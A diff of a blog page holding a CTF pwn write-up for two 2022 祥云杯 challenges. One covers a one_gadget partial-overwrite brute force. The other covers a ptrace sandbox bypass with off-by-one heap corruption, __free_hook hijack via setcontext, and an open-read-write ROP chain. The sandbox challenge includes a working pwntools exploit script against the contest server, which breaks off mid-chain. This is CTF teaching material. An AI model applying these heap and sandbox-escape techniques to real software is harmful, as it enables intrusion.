@@ -20,45 +20,45 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="unexploitable保护策略：    利用思路：  因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。 通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_g">
+    <meta name="description" content="赛题WP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022_祥云杯_pwn 部分wp">
 <meta property="og:url" content="https://zikh26.github.io/posts/30a1c326.html">
 <meta property="og:site_name" content="ZIKH26&#39;s Blog">
-<meta property="og:description" content="unexploitable保护策略：    利用思路：  因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。 通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_g">
+<meta property="og:description" content="赛题WP">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221029152901840.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221029153046424.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221029153558694.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037933.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037934.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037935.png">
 <meta property="og:image" content="https://zikh26.github.io/img/image-20221029154216496.png">
 <meta property="og:image" content="https://zikh26.github.io/img/image-20221029155442239.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221030114249283.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031093052357.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031093545472.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031093911118.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031094002359.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031094347999.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031100404042.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031101842345.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031102022071.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031102056360.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031102922661.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031103414119.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221030114430759.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221030115609820.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031111347679.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037936.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037937.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037938.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037939.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037940.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037941.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037942.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037943.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037944.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037945.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037946.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037947.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037948.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037949.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037950.png">
 <meta property="og:image" content="https://zikh26.github.io/img/image-20221030171048862.png">
 <meta property="og:image" content="https://zikh26.github.io/img/image-20221031122947443.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031162148626.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031162709412.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031171824181.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031172450922.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031172603962.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031183209848.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037951.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037952.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037953.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037954.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037955.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037956.png">
 <meta property="og:image" content="https://zikh26.github.io/img/image-20221031183654159.png">
-<meta property="og:image" content="https://zikh26.github.io/img/image-20221031183954894.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037957.png">
 <meta property="article:published_time" content="2023-05-14T23:36:47.431Z">
-<meta property="article:modified_time" content="2022-10-31T12:55:25.705Z">
+<meta property="article:modified_time" content="2023-07-01T12:38:32.854Z">
 <meta property="article:author" content="ZIKH26">
 <meta property="article:tag" content="orw">
 <meta property="article:tag" content="one_gadget">
@@ -66,7 +66,7 @@
 <meta property="article:tag" content="沙箱逃逸">
 <meta property="article:tag" content="off by null">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zikh26.github.io/img/image-20221029152901840.png">
+<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037933.png">
 
 
 <link rel="canonical" href="https://zikh26.github.io/posts/30a1c326.html">
@@ -163,7 +163,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">96</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -174,7 +174,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">100</span>
+        <span class="site-state-item-count">99</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -237,7 +237,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-31 20:55:25" itemprop="dateModified" datetime="2022-10-31T20:55:25+08:00">2022-10-31</time>
+      <time title="修改时间：2023-07-01 20:38:32" itemprop="dateModified" datetime="2023-07-01T20:38:32+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -258,15 +258,18 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="../img/image-20221029152901840.png" alt="image-20221029152901840" style="zoom:50%;" />
+    <div class="post-body" itemprop="articleBody"><p>赛题WP</p>
+<span id="more"></span>
+
+<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037933.png" alt="image-20221029152901840" style="zoom:50%;" />
 
 
 
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><img src="../img/image-20221029153046424.png" alt="image-20221029153046424" style="zoom:50%;" />
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037934.png" alt="image-20221029153046424" style="zoom:50%;" />
 
 <p>因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。</p>
 <p>通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_gadget。通过用set命令更改内存的值为one_gadget，发现第一个one_gadget就能用(如下)</p>
-<img src="../img/image-20221029153558694.png" alt="image-20221029153558694" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037935.png" alt="image-20221029153558694" style="zoom:50%;" />
 
 <p>于是思路就是将libc start main的后三字节，改为one_gadget地址(由于libc地址后三位是固定的，所以我们需要爆破前三位，概率为1&#x2F;4096)。</p>
 <p>但如果我们单纯的填垃圾数据，然后溢出篡改的话，情况如下</p>
@@ -278,47 +281,47 @@
 
 <p><img src="/../img/image-20221029155442239.png" alt="image-20221029155442239"></p>
 <p>hhhh，运气不够，终端来凑，开了12个，爆了六七分钟。</p>
-<h2 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221030114249283.png" alt="image-20221030114249283"></p>
+<h2 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037936.png" alt="image-20221030114249283"></p>
 <h3 id="沙箱分析："><a href="#沙箱分析：" class="headerlink" title="沙箱分析："></a>沙箱分析：</h3><p>因为本人比较菜，第一次见到题目给的这种沙箱文件，再加上比较好奇，就研究了一番，大致的分析过程如下：</p>
 <p>通过查阅资料发现ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)的第四个参数是&amp;regs，而这个regs是在ptrace.h定义的一个结构体user_regs_struct(用来保存各个寄存器的值)，我们再去看下IDA里的伪代码(如下)，发现第四个参数是v8，因此判断v8就是user_regs_struct结构体</p>
-<img src="../img/image-20221031093052357.png" alt="image-20221031093052357" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037937.png" alt="image-20221031093052357" style="zoom:50%;" />
 
 
 
 <p>所以我们去将v8的类型改成user_regs_struct(如下)</p>
-<p><img src="/../img/image-20221031093545472.png" alt="image-20221031093545472"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037938.png" alt="image-20221031093545472"></p>
 <p>同时还可以看到由于v8确定为结构体后，里面的一些寄存器也在IDA中显示了出来</p>
-<img src="../img/image-20221031093911118.png" alt="image-20221031093911118" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037939.png" alt="image-20221031093911118" style="zoom:50%;" />
 
 
 
 <p>这时候我们从头分析一下，fork的返回值给了v3，然后又把v3给v4.接着if(v3)，而fork函数会有两个返回值，原本的父进程会返回子进程的id,而子进程则返回0。所以接下来的if(v3)只有父进程(sandbox)能进</p>
-<p><img src="/../img/image-20221031094002359.png" alt="image-20221031094002359"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037940.png" alt="image-20221031094002359"></p>
 <p>子进程返回的是0，所以触发else(如下)</p>
-<p><img src="/../img/image-20221031094347999.png" alt="image-20221031094347999"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037941.png" alt="image-20221031094347999"></p>
 <p>第一行的ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)表示被父进程跟踪，任何信号(包括子进程中执行的syscall)都会暂停子进程，阻塞与wait()等待的父进程被唤醒。第二行的execvp则执行了a2[1]这个文件，a2则是命令行参数，这道题的沙箱自然是给sandboxheap开的，所以本题正确的运行方式应该是<code>./sandbox ./sandboxheap</code> ，这样子进程就调用了题目的附件。从而实现了个sandboxheap开了一个沙箱保护。</p>
 <p>接着回到父进程那边，现在去看一下这个沙箱是怎么实现对某些系统调用的拦截的</p>
-<p><img src="/../img/image-20221031100404042.png" alt="image-20221031100404042"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037942.png" alt="image-20221031100404042"></p>
 <p>在①的位置使用了ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)，此时子进程的寄存器信息会存储到regs结构体里，而在②的上面一行，去赋给了regs.rax为-1，然后执行②的时候，ptrace(PTRACE_SETREGS, child_pid, NULL, &amp;regs) 会将regs结构体里的值拷贝给子进程的各个寄存器，这样子进程的rax就变成了-1，当子进程去执行syscall的时候发现rax是一个无效的系统调用号，就会报bad syscall从而完成了拦截。</p>
 <p>而我们要绕过沙箱的禁用，所以想办法不能被拦截下来。重新看一下规则，只要我们能保证这个位置的数值是0，那就不会被拦截下来(如下)</p>
-<p><img src="/../img/image-20221031101842345.png" alt="image-20221031101842345"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037943.png" alt="image-20221031101842345"></p>
 <p>但是在最开始执行alarm系统调用(系统调用号为37)的时候，对0x202040这片内存进行了赋值为1的操作(如下)，也就是说正常的话，我们rax无论是多少，最终加上0x202040这个地址拿到的都是1，从而被拦截。</p>
-<p><img src="/../img/image-20221031102022071.png" alt="image-20221031102022071"></p>
-<img src="../img/image-20221031102056360.png" alt="image-20221031102056360" style="zoom:50%;" />
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037944.png" alt="image-20221031102022071"></p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037945.png" alt="image-20221031102056360" style="zoom:50%;" />
 
 <p>但是我们发现程序里给了一些位置为0的机会，我们将给的这些地址都去减0x202040后，看一下对应的系统调用(如下)</p>
 <p>如果我们想把open和read、write都位置都置成1，那就需要下面的两个if全部进入，而a1如果为3的话，就可以满足两个if的判断</p>
-<img src="../img/image-20221031102922661.png" alt="image-20221031102922661" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037946.png" alt="image-20221031102922661" style="zoom:50%;" />
 
 <p>这个a1就是rdi，而想进入这个函数，需要rax为0x2710(如下)</p>
-<img src="../img/image-20221031103414119.png" alt="image-20221031103414119" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037947.png" alt="image-20221031103414119" style="zoom:50%;" />
 
 <p>综上所述，如果我们想完成orw的话，需要在此之前设置rdi为3 rax为0x2710并执行一次syscall，才能自定义一个能够orw的白名单。</p>
-<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><img src="../img/image-20221030114430759.png" alt="image-20221030114430759" style="zoom:50%;" />
+<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037948.png" alt="image-20221030114430759" style="zoom:50%;" />
 
 <p>在edit函数里，input函数(函数已重命名)的参数有个+1，所以判断这里是存在个溢出的。</p>
 <p>然后input函数里面是这样的(如下)</p>
-<img src="../img/image-20221030115609820.png" alt="image-20221030115609820" style="zoom:50%;" />
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037949.png" alt="image-20221030115609820" style="zoom:50%;" />
 
 <p>说实话这个我没太看懂，不过根据调试和师傅们的提示，感觉这里的大概意思就是说，我们输入的一个字节只取末尾一个比特，而八个字节就会取出来八个比特，这取出来的八个比特才表示出了一个字节。在以前我们想发送p64()打包后的数据，仅仅只需要发送八字节，但是在这题里，我们需要用64个字节来表示一个八字节的地址。</p>
 <p>举个例子，我们原本要往内存里写一个地址为<code>0xdeadbeef</code>，以前的话，我们使用p64(0xdeadbeef)即可，但是这道题的话，我们使用下面的部分才能达到同样的效果</p>
@@ -336,7 +339,7 @@
 <p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p>
 <h3 id="关于setcontext"><a href="#关于setcontext" class="headerlink" title="关于setcontext"></a>关于setcontext</h3><p>由于是第一次利用这个setcontext，所以对setcontext做一点总结。</p>
 <p>这个setcontext是libc库里的一个函数，汇编代码如下:</p>
-<p><img src="/../img/image-20221031111347679.png" alt="image-20221031111347679"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037950.png" alt="image-20221031111347679"></p>
 <p>通过汇编代码发现，该函数主要是通过取rdi加上偏移的内存来对大部分寄存器进行了赋值，如果我们能够控制rdi，并且让rdi之后的一定内存都是可控的，就相当于我们可以控制大部分寄存器的值了。假设我们将free_hook劫持为setcontext+53的地址,因为free函数时rdi本身就是堆块的地址，所以rdi之后的内存我们也是可控的，这样下次执行free的时候，就可以控制大部分的寄存器了。需要注意的是，为了保证执行流不断，所以我们要控制rcx寄存器，在上面的汇编中有一个push rcx，而接下来最后是一个ret可以将执行流控制到rcx上，换句话说，最后setcontext执行完的rip由rcx决定。利用思路就是设置大部分寄存器，然后去打一个read的系统调用，将orw的rop链读到read函数要返回的地址上，完成orw。</p>
 <h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:12243&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x67616c662f2e</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#rsp heap_addr+0x640 0xa0</span></span><br><span class="line"><span class="comment">#rsi heap_addr+0x6b0 0x70</span></span><br><span class="line"><span class="comment">#rdi heap_addr+0x6a8 0x68</span></span><br><span class="line"><span class="comment">#rdx heap_addr+0x6c8 0x88</span></span><br><span class="line"><span class="comment">#rcx heap_addr+0x6e8 0xa8</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000130514</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">payload=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">12</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x640</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">3</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x800</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdx</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x648</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsp</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(context_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>,<span class="number">0xBA7</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x2710</span>)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(heap_addr + <span class="number">0x7f0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span 